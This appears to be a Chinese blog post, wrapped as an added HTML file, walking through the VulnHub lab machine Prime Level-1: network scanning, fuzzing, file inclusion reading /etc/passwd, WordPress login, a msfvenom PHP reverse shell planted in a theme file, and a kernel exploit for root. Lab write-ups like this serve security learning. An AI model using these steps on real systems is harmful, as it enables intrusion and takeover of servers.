@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Prime_series_Level-1 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Prime_series_Level-1</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">扫描局域网c段主机</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">扫描端口获得运行服务</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">扫描目录获得关键信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">FUZZ模糊测试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">文件包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">文件包含漏洞</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">wordpress 漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">wpcan</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">文件上传</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">msfvenom 生成反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">内核漏洞提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p>攻击机：Kali  					靶机：Ubuntu<br>IP： 192.168.119.153			IP:</p>
+<p><a name="Bhvh3"></a></p>
+<h1><span id="扫描局域网c段主机">扫描局域网c段主机</span></h1><p>方法一： nmap -sV -T4 -O 192.168.119.0&#x2F;24 <br>方法二： netdiscover -i eth0 -r 192.168.119.1&#x2F;24 <br>1.扫描到是1,2 ，245这种基本不是要找的靶机 <br>下面这个.152很适合 开启了 22,80端口<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642565132313-c53fceb9-40ff-4892-bd34-e943a6d16668.png#clientId=u2d2af93c-7c38-4&from=paste&height=151&id=u4f3910c6&name=image.png&originHeight=301&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37845&status=done&style=none&taskId=ued28e15a-66f8-46e9-b58f-e2c23649ccd&title=&width=432.5" alt="image.png"><br>方法三：arp-scan -l <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642565327974-8089af0e-0370-43bb-a548-4611b6bea15b.png#clientId=u2d2af93c-7c38-4&from=paste&height=113&id=uf459e104&name=image.png&originHeight=226&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27659&status=done&style=none&taskId=ud2c2b0af-e225-4135-8332-a8588fcf5f8&title=&width=415.5" alt="image.png"><br><a name="vKeNZ"></a></p>
+<h2><span id="扫描端口获得运行服务"><strong>扫描端口获得运行服务</strong></span></h2><p>nmap  -p 1-65535 -A 192.168.119.152  <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642565768872-7108842f-15e5-49b2-8aef-8ac5766cd1b4.png#clientId=u2d2af93c-7c38-4&from=paste&height=295&id=ud18be7dd&name=image.png&originHeight=590&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67145&status=done&style=none&taskId=u37509575-c06e-47e8-baed-206b66f09f0&title=&width=461.5" alt="image.png"><br><strong>可以看出开启了22端口和80端口 <strong><br><strong>80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</strong><br></strong>|_http-title: HacknPentest</strong><br><strong>|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</strong><br><strong>这里22端口只能ssh 这个应该行不通 ,所以尝试80端口</strong><br><strong>浏览器打开192.168.119.152</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642565990555-935b0a40-7759-460c-af67-6410598ce274.png#clientId=u2d2af93c-7c38-4&from=paste&height=313&id=uaa86628c&name=image.png&originHeight=888&originWidth=1663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=890890&status=done&style=none&taskId=u1a111a10-5e02-4488-b7df-061ad39f675&title=&width=586" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642566032829-cb96d4e8-393a-4fa1-ab28-a35308f3bba1.png#clientId=u2d2af93c-7c38-4&from=paste&height=175&id=u5329f559&name=image.png&originHeight=350&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18555&status=done&style=none&taskId=uc2acb021-c381-496b-b747-a7de3c377ec&title=&width=437.5" alt="image.png"><br>这里它什么也没有就只有一张kali图片 ….额这<br><a name="yQqLg"></a></p>
+<h1><span id="扫描目录获得关键信息">扫描目录获得关键信息</span></h1><p>1.dirb <a target="_blank" rel="noopener" href="http://192.168.119.152/">http://192.168.119.152</a><br>2.御剑<br>3.AWVS <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642566347712-8fcf796d-a7ed-48b3-99d7-bd3eeb5dd8bf.png#clientId=u2d2af93c-7c38-4&from=paste&height=264&id=u2c41f83c&name=image.png&originHeight=527&originWidth=767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45021&status=done&style=none&taskId=u83cb03d5-ccc3-4c18-a6bf-3e058cb3f18&title=&width=383.5" alt="image.png"><br>我们查看一下第一个目录&#x2F;dev<br>给了我一段话 ，说我正处于0阶段，多多少少有点嘲讽的意思了啊<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642566447599-7527bf8b-30a0-4124-8934-23ea45509f02.png#clientId=u2d2af93c-7c38-4&from=paste&height=137&id=uc7fa757d&name=image.png&originHeight=273&originWidth=642&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11210&status=done&style=none&taskId=ucf55c3b2-6445-44e9-9cbc-f2c020c0b16&title=&width=321" alt="image.png"><br>下面还有一个index.php 但是打开还是一个 图片 。<br>再使用dirb工具加上参数过滤一下<br> dirb <a target="_blank" rel="noopener" href="http://192.168.119.152/">http://192.168.119.152</a> -X .txt,.php,zip <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642566686066-505ef028-2089-4f39-a856-bd55fdfe52f7.png#clientId=u2d2af93c-7c38-4&from=paste&height=261&id=u06c903b0&name=image.png&originHeight=521&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39008&status=done&style=none&taskId=u7c0f5e99-6ad2-49de-84fb-ce066a26578&title=&width=333.5" alt="image.png"><br>可以发现找到三个文件，前面两个都看过了 没有啥 还有一个.txt文件，查看一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642566798999-0725476c-1dd2-4deb-b2e8-1309748e160c.png#clientId=u2d2af93c-7c38-4&from=paste&height=144&id=u9cb5979a&name=image.png&originHeight=288&originWidth=608&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14476&status=done&style=none&taskId=ucf39bcb6-83c6-4354-9f0b-bfc2bc89aa4&title=&width=304" alt="image.png"><br>他这个是告诉我们使用fuzz工具进去webphp过滤查找不一样<br>FUZZ<br><a name="i3moc"></a></p>
+<h2><span id="fuzz模糊测试">FUZZ模糊测试</span></h2><p>使用FUZZ代替目录,fuzz字典替换<br>FUZZ 找到正确的参数 <br>目录扫描<br>XSS SQL注入<br>压力测试<br>密码爆破<br>——————————————————————————————————————————<br>接着上面提示 到当我们找到  location.txt 文件 我我们就可以下一步了<br>&#x2F;&#x2F;see the location.txt and you will get your next move&#x2F;&#x2F;<br>wfuzz 的字典<br>&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642567491183-b5116deb-85aa-40fe-b837-bd3382757749.png#clientId=u2d2af93c-7c38-4&from=paste&height=48&id=u62cfeabe&name=image.png&originHeight=96&originWidth=1035&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12704&status=done&style=none&taskId=ub634218d-6e9f-49c1-880d-d2a245b8eaf&title=&width=517.5" alt="image.png"><br>使用wfuzz 工具进行测试<br>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt  <a target="_blank" rel="noopener" href="http://192.168.119.152/index.php?FUZZ">http://192.168.119.152/index.php?FUZZ</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642567396067-33e63960-f57a-4c46-9ef9-e41c14a5cb20.png#clientId=u2d2af93c-7c38-4&from=paste&height=240&id=u7e1799f0&name=image.png&originHeight=480&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46488&status=done&style=none&taskId=u917bc3bf-0e2c-42dd-a48b-ba3d9d76e27&title=&width=550.5" alt="image.png"><br>扫到951个目录  所以我们要进行过滤<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642567519584-48c68a96-0f0a-4340-bfee-285d8579ee9f.png#clientId=u2d2af93c-7c38-4&from=paste&height=57&id=ue5e82f24&name=image.png&originHeight=113&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7713&status=done&style=none&taskId=u33879e06-596d-459a-8d6d-b2f0ba8fd71&title=&width=364.5" alt="image.png"><br>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt –hw 12 <a target="_blank" rel="noopener" href="http://192.168.119.152/index.php?FUZZ">http://192.168.119.152/index.php?FUZZ</a><br>把是12 的屏蔽掉<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642567713446-a93a6073-964b-44b2-aad2-1df7ced3335d.png#clientId=u2d2af93c-7c38-4&from=paste&height=226&id=u0b25ee50&name=image.png&originHeight=451&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42791&status=done&style=none&taskId=ucc6197b0-332c-4319-b007-1866a1d6189&title=&width=667.5" alt="image.png"><br><a name="efLfs"></a></p>
+<h3><span id="文件包含">文件包含</span></h3><p>找到一个 file 目录<br>000000341:   200        7 L      19 W       206 Ch      “file”             <br>这个一个最常见的文件包含<br>访问一下这个file<br><a target="_blank" rel="noopener" href="http://192.168.119.152/?file=">http://192.168.119.152/?file=</a><br>他说我挖错文件了 ,额..<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642568250625-88bdfa47-7a8e-4836-86d4-540125b4ea3a.png#clientId=u2d2af93c-7c38-4&from=paste&height=95&id=ubed09ae6&name=image.png&originHeight=189&originWidth=494&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6717&status=done&style=none&taskId=u6b1e1398-082e-4a25-98c4-40029eba219&title=&width=247" alt="image.png"><br>我们尝试一下前面找到两个php文件 index,php和 image.php<br>加上试一下,结果还是一样的<br>想一想 还有什么地方 没记到 <br>前面说找到   location.txt 就可以下一步了 再试一下<br>噢  有东西<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642568610689-6743893c-46da-49d1-8892-f9857776ca8d.png#clientId=u2d2af93c-7c38-4&from=paste&height=445&id=uc985638c&name=image.png&originHeight=890&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=409712&status=done&style=none&taskId=u97415526-fef4-4270-8337-b01cc275a35&title=&width=515.5" alt="image.png"><br>use ‘secrettier360’ parameter on some other php page for more fun.<br>说使用secrettier360 可以获得更多参数<br>访问一下<br><a target="_blank" rel="noopener" href="http://192.168.119.152/image.php?secrettier360=">http://192.168.119.152/image.php?secrettier360=</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642568792427-1ac518d1-3914-4ef2-bb2c-45b10e802cb1.png#clientId=u2d2af93c-7c38-4&from=paste&height=423&id=u4f06437c&name=image.png&originHeight=825&originWidth=858&originalType=binary&ratio=1&rotation=0&showTitle=false&size=351628&status=done&style=none&taskId=ufd15a72a-58cb-4c5b-add4-af8af066d55&title=&width=440" alt="image.png"><br>得到了正确的参数 额。。。<br>那我们测试一下访问一下文件 <br>我们访问一下 &#x2F;etc&#x2F;passwd文件 就可以找到用户这些信息了<br><a name="Fv4ZI"></a></p>
+<h3><span id="文件包含漏洞">文件包含漏洞</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642568922442-2d77eba7-8570-4494-a4a9-be1dee97083f.png#clientId=u2d2af93c-7c38-4&from=paste&height=439&id=u1e51fd7a&name=image.png&originHeight=878&originWidth=1268&originalType=binary&ratio=1&rotation=0&showTitle=false&size=408603&status=done&style=none&taskId=ufb79ae80-0956-41c5-9ee0-592e21297bf&title=&width=634" alt="image.png"><br>看不清太乱了 使用 curl 有换行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642569004377-9e013b37-25ca-4eb6-8010-f5cadaa970b5.png#clientId=u2d2af93c-7c38-4&from=paste&height=328&id=u8da09536&name=image.png&originHeight=656&originWidth=819&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82448&status=done&style=none&taskId=uddaef074-a95e-463c-947b-168a3a7724c&title=&width=409.5" alt="image.png"><br>这里一一句话 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642569135770-9b583abd-e13f-45d8-a0c0-c737c7e9aa75.png#clientId=u2d2af93c-7c38-4&from=paste&height=15&id=uc2fcf542&name=image.png&originHeight=29&originWidth=738&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4051&status=done&style=none&taskId=u6efb2306-bad2-4761-adce-ef857080e1e&title=&width=369" alt="image.png"><br>让看一下 password.txt 文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642569327598-0a1207a6-c9b1-4105-bf39-c0b1411d376e.png#clientId=u2d2af93c-7c38-4&from=paste&height=435&id=ua2a51ca0&name=image.png&originHeight=869&originWidth=925&originalType=binary&ratio=1&rotation=0&showTitle=false&size=382900&status=done&style=none&taskId=u9336ce75-6530-42ee-8224-9b52e3f8088&title=&width=462.5" alt="image.png"><br>这是一个密码 ???? 但是没有用户啊 <br>再扫一边目录 看一下 一什么 <br>一一个wordpress 博客 系统 我们去试一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642569422804-9a36f8b1-7c3e-4ba5-8ddc-eae3af8a0ccb.png#clientId=u2d2af93c-7c38-4&from=paste&height=76&id=u01bdf6b1&name=image.png&originHeight=152&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20205&status=done&style=none&taskId=ub4d381bc-593d-45c0-a14f-87f1c5426a2&title=&width=307.5" alt="image.png"><br><a name="O4Wlp"></a></p>
+<h1><span id="wordpress-漏洞">wordpress 漏洞</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642569531212-741e6460-8537-4de9-bee9-416316eca965.png#clientId=u2d2af93c-7c38-4&from=paste&height=388&id=u7df9e38a&name=image.png&originHeight=776&originWidth=1252&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48195&status=done&style=none&taskId=ue34e9be3-5b6a-41eb-b491-a507dc1dc96&title=&width=626" alt="image.png"><br>找到一个博客系统 <br>使用弱口令试一下<br>不行  hh<br><a name="ktHHS"></a></p>
+<h2><span id="wpcan">wpcan</span></h2><p>使用wscan 工具进行 扫描<br>wpscan –url <a target="_blank" rel="noopener" href="http://192.168.119.152/wordpress/">http://192.168.119.152/wordpress/</a>   –enumerate u    <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642570231227-b7865ba8-4a09-4f1b-9d26-042d51b28e48.png#clientId=u2d2af93c-7c38-4&from=paste&height=175&id=u07c80c16&name=image.png&originHeight=349&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21599&status=done&style=none&taskId=udcc9d379-2d1e-4565-917c-cfce9121f8c&title=&width=340.5" alt="image.png"></p>
+<p>扫描到了 一个 voctor 用户<br>测试刚才的密码是不是这个博客用户的密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642571319478-3e2e6c23-02a2-4166-8df8-3944108067c2.png#clientId=u2d2af93c-7c38-4&from=paste&height=441&id=ue4501991&name=image.png&originHeight=881&originWidth=1337&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114580&status=done&style=none&taskId=ue17becf5-90bb-49ab-b993-aab5da17089&title=&width=668.5" alt="image.png"><br>不出所料 登上去了 <br>我们找一下看哪里可以上传一下webshell<br><a name="OAsu4"></a></p>
+<h2><span id="文件上传">文件上传</span></h2><p>找一下文件上传点<br>找到一个主题编辑区<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642571636429-05cb115f-fd1c-4d4b-93a1-85a873b0d688.png#clientId=u2d2af93c-7c38-4&from=paste&height=512&id=u5402213e&name=image.png&originHeight=1024&originWidth=1854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=166870&status=done&style=none&taskId=uff546a87-453b-4435-a13b-7c94ff86a23&title=&width=927" alt="image.png"><br>找一个可以写入的主题编辑区  secret.php<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642571716147-5804b1b8-3ef5-4dfc-8c0c-541943751d85.png#clientId=u2d2af93c-7c38-4&from=paste&height=387&id=uac2126f7&name=image.png&originHeight=774&originWidth=1657&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63755&status=done&style=none&taskId=u3a330d1a-1c25-4413-bdc9-89a68b09bb6&title=&width=828.5" alt="image.png"><br>现在就可以写一句话木马 啥的啦<br>这里不是使用一句话 使用msf生成反弹shell<br><a name="EnaVi"></a></p>
+<h2><span id="msfvenom-生成反弹shell">msfvenom 生成反弹shell</span></h2><p>msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.119.153 lport&#x3D;7777 -o shell.php     <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642572972236-75dcdb10-763c-48e7-b0b9-494cae0a49b2.png#clientId=u2d2af93c-7c38-4&from=paste&height=192&id=u84091a19&name=image.png&originHeight=383&originWidth=1577&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74959&status=done&style=none&taskId=u5b466e3c-c971-467d-8732-961661abb48&title=&width=788.5" alt="image.png"></p>
+<p>上传上去<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642573098660-14d09147-d132-4e48-9c2e-c1a5fbe7ff52.png#clientId=u2d2af93c-7c38-4&from=paste&height=202&id=ucf1b1fce&name=image.png&originHeight=404&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45410&status=done&style=none&taskId=u14c899ee-48a0-40ba-b037-7b0bbba60f9&title=&width=467" alt="image.png"><br>启用监听<br>msf<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642573381066-c0f92e22-d267-4026-8d72-735ff85a5d96.png#clientId=u2d2af93c-7c38-4&from=paste&height=154&id=u33335e69&name=image.png&originHeight=308&originWidth=775&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38939&status=done&style=none&taskId=u89505b82-4c73-4d0d-8624-ca528da18e0&title=&width=387.5" alt="image.png"><br>反弹shell 成功<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642573540019-5f520445-f588-4941-a8e7-2308868b194d.png#clientId=u2d2af93c-7c38-4&from=paste&height=101&id=uc871f0dd&name=image.png&originHeight=201&originWidth=1014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20531&status=done&style=none&taskId=ue670b39f-eaa7-4d29-93cf-fca47627ca3&title=&width=507" alt="image.png"><br><a name="uEpan"></a></p>
+<h1><span id="内核漏洞提权">内核漏洞提权</span></h1><p>msf查找漏洞提权利用脚本<br>searchsploit  16.04 ubuntu<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642573962215-3f4e67b3-374a-4f88-8955-82c8756f9da4.png#clientId=u2d2af93c-7c38-4&from=paste&height=289&id=u530b44d5&name=image.png&originHeight=578&originWidth=1513&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141952&status=done&style=none&taskId=u9653c535-c5f7-4954-8638-7da0c72e229&title=&width=756.5" alt="image.png"><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 &#x2F; Fedora 27) - Local Privilege Escalation             | linux&#x2F;local&#x2F;45010.c<br>把这个45010.c 文件进行编译<br>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;45010.c .&#x2F;<br>gcc 45010.c -o  45010    <br>把45010 穿个 靶机的&#x2F;tmp 目录下 <br>&#x2F;tmp目录每个用户都有读写权限<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642574293559-cc96b5c2-32a5-4c58-bd0b-1badd17d0893.png#clientId=u2d2af93c-7c38-4&from=paste&height=47&id=ucbfb5079&name=image.png&originHeight=94&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11139&status=done&style=none&taskId=uf19790d8-6d09-4774-a621-972f93d1102&title=&width=361" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642577758788-a92754fc-aaba-4549-8ddc-7954f3ea42fa.png#clientId=u8cb5c912-0126-4&from=paste&height=556&id=u2c1ce8ea&name=image.png&originHeight=556&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34921&status=done&style=none&taskId=ud996720a-c3ae-486d-ada3-d4897e828b1&title=&width=791" alt="image.png"><br>上传成功<br>cd &#x2F;tmp<br>chmod +x 45010<br>.&#x2F;45010<br>cat root.txt</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/Hard_socnet2/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Hard_socnet2</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/Sunset-1/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Sunset-1
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
